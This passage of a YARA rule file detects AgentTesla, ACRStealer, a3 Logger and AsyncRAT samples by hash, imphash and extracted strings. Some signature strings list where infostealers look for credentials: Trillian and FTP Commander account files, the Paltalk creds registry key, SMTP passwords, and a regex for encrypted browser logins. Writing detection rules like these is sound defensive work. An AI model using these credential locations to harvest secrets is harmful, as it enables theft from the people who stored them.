      description = "_subset_batch - from files a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe_a6180d4d.exe, ACRStealer(signature)_297cfecdeec7600638a2d663ab104d8a(imphash).dll, ACRStealer(signature)_587336fb.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe"
      hash2 = "1c53636c057477792d6accc5431aae32e85225584c5bfb5ff609a8457b8a71df"
      hash3 = "587336fb764ff669fdf36ec1043d6cedaf092d49fc8b2f3a7ac90ed37a636690"
   strings:
      $s1 = "Private-Key: (%d bit, %d primes)" fullword ascii /* score: '13.00'*/
      $s2 = "%s:%d: OpenSSL internal error: %s" fullword ascii /* score: '12.50'*/
      $s3 = "X509_PUBKEY_get0" fullword ascii /* score: '12.00'*/
      $s4 = "\\(a8Bk" fullword ascii /* reversed goodware string 'kB8a(\\' */ /* score: '12.00'*/
      $s5 = "hexsecret" fullword ascii /* score: '11.00'*/
      $s6 = "siphash" fullword ascii /* score: '11.00'*/
      $s7 = "hexpass" fullword ascii /* score: '11.00'*/
      $s8 = "%*s%s Private-Key:" fullword ascii /* score: '10.00'*/
      $s9 = "%*s<INVALID PUBLIC KEY>" fullword ascii /* score: '10.00'*/
      $s10 = "assertion failed: nkey <= EVP_MAX_KEY_LENGTH" fullword ascii /* score: '10.00'*/
      $s11 = "%*s<INVALID PRIVATE KEY>" fullword ascii /* score: '10.00'*/
      $s12 = "%*s%s Public-Key:" fullword ascii /* score: '10.00'*/
      $s13 = "assertion failed: keylen <= sizeof(key)" fullword ascii /* score: '10.00'*/
      $s14 = "SIPHASH" fullword ascii /* score: '9.50'*/
      $s15 = "EC_POINT_get_affine_coordinates" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4b50 ) and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__db8eb084_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ab62a7d3_14 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_db8eb084.tar, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ab62a7d3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db8eb084eeec065e1586b6309cc67e16067415395d17849ec591601455a41540"
      hash2 = "ab62a7d35a0f1e352c460706c63056dd56d6b6733bb3cc292d39f15a1adb4dea"
   strings:
      $s1 = "Alyxdc.exe" fullword wide /* score: '22.00'*/
      $s2 = "Alyxdc.Processing" fullword ascii /* score: '18.00'*/
      $s3 = "DAlyxdc, Version=1.0.7361.16468, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "ExecutorEngine" fullword ascii /* score: '16.00'*/
      $s5 = "InformScopeProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "PushProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "Alyxdc.Templating" fullword ascii /* score: '14.00'*/
      $s8 = "AlertAdaptableEncryptor" fullword ascii /* score: '14.00'*/
      $s9 = "_TemplateReporterPosition" fullword ascii /* score: '14.00'*/
      $s10 = "HandleSchema" fullword ascii /* base64 encoded string 'jwey'!zf' */ /* score: '14.00'*/
      $s11 = "DecodeTemplate" fullword ascii /* score: '13.00'*/
      $s12 = "InstantiateConnectedTemplate" fullword ascii /* score: '11.00'*/
      $s13 = "GenerateAttachedTemplate" fullword ascii /* score: '11.00'*/
      $s14 = "OrderedTemplate" fullword ascii /* score: '11.00'*/
      $s15 = "UpdateTemplate" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x4853 or uint16(0) == 0x5a4d ) and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__9dc82c6c_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8bd2c651_15 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_9dc82c6c.tar, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8bd2c651.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9dc82c6c6453cc8358d1fecaf97ab9ac6779eca4f82b5d107f04d7855a6479e5"
      hash2 = "8bd2c651c8b7c83857910953ecbe52a7402bf13aa53c26daa073feca4e7ebeaa"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "Jcvvwc.exe" fullword wide /* score: '22.00'*/
      $s3 = "DJcvvwc, Version=1.0.8002.17258, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "AQ4lSq5efCUzWKdWMQM/UaUdEwQlW6ZRPg5tea5HFxkiTLJyIQQzU6lfK0wxW79sFAI6UoVSPxJtUbtsGxkzT75SPh4iR/BUNwMJcq5dNQM+BYxWJiMvTq51IBg7dqpd" wide /* score: '11.00'*/
      $s5 = "Yxzv.hlx%" fullword ascii /* score: '10.00'*/
      $s6 = "X* --=" fullword ascii /* score: '9.00'*/
      $s7 = "* GGdVF6" fullword ascii /* score: '9.00'*/
      $s8 = "ffefefeeffea" ascii /* score: '8.00'*/
      $s9 = "afefefeffehah" fullword ascii /* score: '8.00'*/
      $s10 = "afeffefeeffea" ascii /* score: '8.00'*/
      $s11 = "sfefeffeef" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x654e or uint16(0) == 0x5a4d ) and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe_a6180d4d_ACRStealer_signature__587336fb_16 {
   meta:
      description = "_subset_batch - from files a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe_a6180d4d.exe, ACRStealer(signature)_587336fb.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe"
      hash2 = "587336fb764ff669fdf36ec1043d6cedaf092d49fc8b2f3a7ac90ed37a636690"
   strings:
      $s1 = "loader incomplete" fullword ascii /* score: '18.00'*/
      $s2 = "log conf missing description" fullword ascii /* score: '17.00'*/
      $s3 = "process_pci_value" fullword ascii /* score: '15.00'*/
      $s4 = "process_include" fullword ascii /* score: '15.00'*/
      $s5 = "log conf invalid key" fullword ascii /* score: '14.00'*/
      $s6 = "operation fail" fullword ascii /* score: '14.00'*/
      $s7 = "ssl command section empty" fullword ascii /* score: '14.00'*/
      $s8 = "get raw key failed" fullword ascii /* score: '14.00'*/
      $s9 = "ssl command section not found" fullword ascii /* score: '14.00'*/
      $s10 = "ladder post failure" fullword ascii /* score: '14.00'*/
      $s11 = "ambiguous host or service" fullword ascii /* score: '14.00'*/
      $s12 = "log conf missing key" fullword ascii /* score: '14.00'*/
      $s13 = "malformed host or service" fullword ascii /* score: '14.00'*/
      $s14 = "log key invalid" fullword ascii /* score: '14.00'*/
      $s15 = "no hostname or service specified" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4b50 ) and filesize < 28000KB and pe.imphash() == "831cf1eb92db57d45b572547813631a4" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__462a1c4623dd5653cfbabfcb88d6bdd9_imphash__AgentTesla_signature__bb4d11c9_17 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_bb4d11c9.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash2 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
   strings:
      $x1 = "ShiftRightArithmeticRoundedNarrowingSaturateLowerGCHeapDumpKeywordU1NGetCurrentMethodImpersonationIsVolatilepHasBlockingAdjustme" ascii /* score: '48.00'*/
      $x2 = "GraphemeClusterBreakTypeTaskMultiTaskContinuationEmptyTaskListFlowControl:CultureNameYieldFreeNamedSlotXNegativeInfinityPayloadN" ascii /* score: '45.00'*/
      $x3 = "System.Private.TypeLoader, Version=7.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798edFxResources.System.Private.TypeLoad" ascii /* score: '43.00'*/
      $x4 = "System.Private.Reflection.Execution, Version=7.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798exFxResources.System.Privat" ascii /* score: '39.00'*/
      $x5 = "ileIndexTryLengthwReserved12AmgetExceptionObjectMutex0WebUtilityLVStackKeyworddSetGetMethodremoveResolvingUnmanagedDllMethodTabl" ascii /* score: '32.00'*/
      $x6 = "cellationToken<RuntimeModuleCalendarIdOptionsRFILEAPPENDDATAInvokeEventCommandEventArgs\\HeaderVersionNumbergetMutexsetYearMonth" ascii /* score: '32.00'*/
      $x7 = ":System.Private.TypeLoader.dll{A" fullword ascii /* score: '31.00'*/
      $x8 = "System.Console, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aNFxResources.System.Console.SR.resources+f" fullword ascii /* score: '31.00'*/
      $s9 = "@SkipMaxDelayMsCompatibleComparer zCreateTempSubdirectoryDeserializationInProgressSizeParamIndex$|AlwaysCreateSetComparerFileIoC" ascii /* score: '30.00'*/
      $s10 = "ShiftRightArithmeticRoundedNarrowingSaturateLowerGCHeapDumpKeywordU1NGetCurrentMethodImpersonationIsVolatilepHasBlockingAdjustme" ascii /* score: '29.00'*/
      $s11 = "getSetLastErrorSize324xReadInt32LittleEndianCompletedWorkItemCountMonitoringKeyword8NRefreshEndfinallyInstalledWin32CulturesHFAr" ascii /* score: '28.00'*/
      $s12 = "codeLastFromUtf8PclmulqdqStringBuilderUnicodePsetPercentSymbolgetIsNotSerializedRecentbLoaderOptimizationAttributegetIsDirectory" ascii /* score: '28.00'*/
      $s13 = "getEncodedArgumentgetWrapNonExceptionThrowssetRunContinuationsAsynchronouslyTDefineNestedTypeProcessPathActivityOptionsFJAPANUnr" ascii /* score: '28.00'*/
      $s14 = "SafeHandleZeroOrMinusOneIsInvalidFileNotFoundExceptionOpenHandlezProfileOptimizationsetShortTimePatternreadOnlySystemTimeZones8F" ascii /* score: '27.00'*/
      $s15 = "L(ConcurrentUnifierW`2\"ArraySortHelper`2.LowLevelListWithIList`1:RuntimePlainConstructorInfo`10RuntimeNamedMethodInfo`14<get_Cu" ascii /* score: '27.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4f50 ) and filesize < 16000KB and pe.imphash() == "462a1c4623dd5653cfbabfcb88d6bdd9" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008c_18 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_bb4d11c9.tar, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash3 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash4 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash5 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash6 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash7 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash8 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash9 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash10 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash11 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash12 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash13 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash14 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
      hash15 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash16 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
      hash17 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s2 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s4 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s5 = "icuuc.dll" fullword wide /* score: '23.00'*/
      $s6 = "icuin.dll" fullword wide /* score: '23.00'*/
      $s7 = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '21.00'*/
      $s8 = "4SplitWithoutPostProcessing@" fullword ascii /* score: '20.00'*/
      $s9 = ".SplitWithPostProcessing@" fullword ascii /* score: '20.00'*/
      $s10 = "InitiateUnload.GetResolvedUnmanagedDll@" fullword ascii /* score: '17.00'*/
      $s11 = "0TargetFrameworkAttribute" fullword ascii /* score: '17.00'*/
      $s12 = "&InitCultureDataCore InitUserOverride$GetTimeFormatsCore@" fullword ascii /* score: '17.00'*/
      $s13 = "HTryGetGenericMethodTemplate_Internal" fullword ascii /* score: '16.00'*/
      $s14 = "0VerifyTypeLoaderLockHeld.EnsureTypeHandleForType@" fullword ascii /* score: '16.00'*/
      $s15 = ":GetLocaleInfoCoreUserOverride@" fullword ascii /* score: '16.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x5550 or uint16(0) == 0x4f50 ) and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__18995a61_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_19 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_18995a61.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_63c81072.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_de12b054.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "18995a61b237eedcbdcb77248f0cf89f764341ccd2d2572c11042dab372ce10b"
      hash2 = "63c81072af9b6315f6cbbbdbdf24ae137194d966d0a3200abb3191d335fd3178"
      hash3 = "de12b054a4c58d0d6d7a7f08e1dfd1792b434a1021312eccfa1496f022484480"
   strings:
      $s1 = "org.jdownloader.settings.AccountSettings.accounts.ejs" fullword wide /* score: '28.00'*/
      $s2 = "\\Trillian\\users\\global\\accounts.dat" fullword wide /* score: '26.00'*/
      $s3 = "Software\\A.V.M.\\Paltalk NG\\common_settings\\core\\users\\creds\\" fullword wide /* score: '23.00'*/
      $s4 = "\\\"(hostname|encryptedPassword|encryptedUsername)\":\"(.*?)\"" fullword wide /* score: '23.00'*/
      $s5 = "SystemProcessorPerformanceInformation" fullword ascii /* score: '22.00'*/
      $s6 = "SmtpPassword" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s7 = "GLOZVJ.exe" fullword wide /* score: '22.00'*/
      $s8 = "\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt" fullword wide /* score: '22.00'*/
      $s9 = "\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt" fullword wide /* score: '22.00'*/
      $s10 = "\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt" fullword wide /* score: '22.00'*/
      $s11 = "\\Program Files (x86)\\FTP Commander\\Ftplist.txt" fullword wide /* score: '22.00'*/
      $s12 = "SMTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s13 = "privateinternetaccess.com" fullword wide /* score: '21.00'*/
      $s14 = "paltalk.com" fullword wide /* score: '21.00'*/
      $s15 = "discord.com" fullword wide /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__069393dd_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_20 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_069393dd.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_48683dcd.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6ec17d4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "069393dd8a507d9cc76baffc122ee772fa281d078a95ac7cf2826d05ba251ea3"
      hash2 = "48683dcd70ee544c499f8f810d9e999596277f2033c05596a809e5237c376176"
      hash3 = "a6ec17d481cea993c679860c4037ae733cd954e452fb3aeb99a9194fd332f00f"
   strings:
      $s1 = "get_product" fullword ascii /* score: '9.00'*/
      $s2 = "M- -!I" fullword ascii /* score: '9.00'*/
      $s3 = "get_ReceiptDateTime" fullword ascii /* score: '9.00'*/
      $s4 = "get_tablesManager" fullword ascii /* score: '9.00'*/
      $s5 = "get_ProductBarkod" fullword ascii /* score: '9.00'*/
      $s6 = "get_HowManyTable" fullword ascii /* score: '9.00'*/
      $s7 = "get_gb_Products" fullword ascii /* score: '9.00'*/
      $s8 = "get_ReceiptID" fullword ascii /* score: '9.00'*/
      $s9 = "GetDbProducts" fullword ascii /* score: '9.00'*/
      $s10 = "get_table_Products" fullword ascii /* score: '9.00'*/
      $s11 = "get_dateTime" fullword ascii /* score: '9.00'*/
      $s12 = "get_ProductPrice" fullword ascii /* score: '9.00'*/
      $s13 = "get_ReceiptMoney" fullword ascii /* score: '9.00'*/
      $s14 = "get_receiptWrite" fullword ascii /* score: '9.00'*/
      $s15 = "get_productManager" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008c_21 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash3 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash4 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash5 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash6 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash7 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash8 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash9 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash10 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash11 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash12 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash13 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
      hash14 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $x1 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x2 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $s3 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s6 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
      $s7 = "The specified TaskContinuationOptions combined LongRunning and ExecuteSynchronously.  Synchronous continuations should not be lo" wide /* score: '21.00'*/
      $s8 = "Microsoft.Extensions.DependencyInjection.VerifyOpenGenericServiceTrimmability" fullword ascii /* score: '20.00'*/
      $s9 = "System.Runtime.CompilerServices.RuntimeFeature.IsDynamicCodeSupported" fullword ascii /* score: '20.00'*/
      $s10 = "6GetCurrentProcessorNumberEx" fullword ascii /* score: '20.00'*/
      $s11 = "Attempted to perform an unauthorized operation" fullword wide /* score: '19.00'*/
      $s12 = "Collection was modified; enumeration operation may not execute" fullword wide /* score: '19.00'*/
      $s13 = "Thread was in an invalid state for the operation being executed" fullword wide /* score: '19.00'*/
      $s14 = "System.Runtime.InteropServices.EnableCppCLIHostActivation" fullword ascii /* score: '18.00'*/
      $s15 = "System.Runtime.InteropServices.EnableConsumingManagedCodeFromNativeHosting" fullword ascii /* score: '18.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x5550 ) and filesize < 22000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__a3__Logger_signature__1895460fffad9475fda0c84755ecfee1_imphash__a3__Logger_signature__1895460fffad947_22 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature).img, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_025c1d27.exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_16335f73.exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_1f8238b6.exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_40eef915.exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_41e89ec2.exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_53855fe3.exe, a3--Logger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_f152904e.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_11eb198f.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_13f10212.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_19b1b578.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_3b12c5d2.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_4c655ef4.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_5afa4d3a.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_6f0dc9a7.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_751905f2.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_7810ad9a.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_88a82a53.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_8a040cab.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_90934a72.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_a7bb4580.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_b18e08ab.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_b8156f53.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_bee44d25.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_ea3f8e93.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_f2f7a78a.exe, AgentTesla(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_fea78e68.exe, AgentTesla(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe, AgentTesla(signature)_91d07a5e22681e70764519ae943a5883(imphash)_00346a9f.exe, AgentTesla(signature)_91d07a5e22681e70764519ae943a5883(imphash)_084fea92.exe, AgentTesla(signature)_91d07a5e22681e70764519ae943a5883(imphash)_272820e2.exe, AgentTesla(signature)_91d07a5e22681e70764519ae943a5883(imphash)_6298c804.exe, AgentTesla(signature)_91d07a5e22681e70764519ae943a5883(imphash)_bd46c8b3.exe, AgentTesla(signature)_98f67c550a7da65513e63ffd998f6b2e(imphash).exe, AsyncRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "33a1bba482a74129df733cdb6ee4e8a39d11cafe99015e6963592cea6313db06"
      hash2 = "81aaa4374132fce34696a55cac25f3ab2fcca844500f88d13e4f217cde9349ec"
      hash3 = "025c1d273e83a5e44c7a0aedb9eab452198e764b927d02463fa9c9c3bc0d3a2b"
      hash4 = "16335f7344305e0dbcc1c4225808249325a84a51e4b26afc09467311c9e802fd"
      hash5 = "1f8238b656161f5e598be3a069926d03b1554bdcfd079d0fb11604a64255d368"
      hash6 = "40eef915ba2a07c79245cf756df19409e4ec1aedb063d7a2c7bc9e587d4951d8"
      hash7 = "41e89ec2b3c4ce47dfdaad6287ccce780cfe911787ae00da80a4268a0fa8ef1c"
      hash8 = "53855fe3a5c31ae94a3bfea7892bfa98e0da861a62000863d47ee25eb4a3e4de"
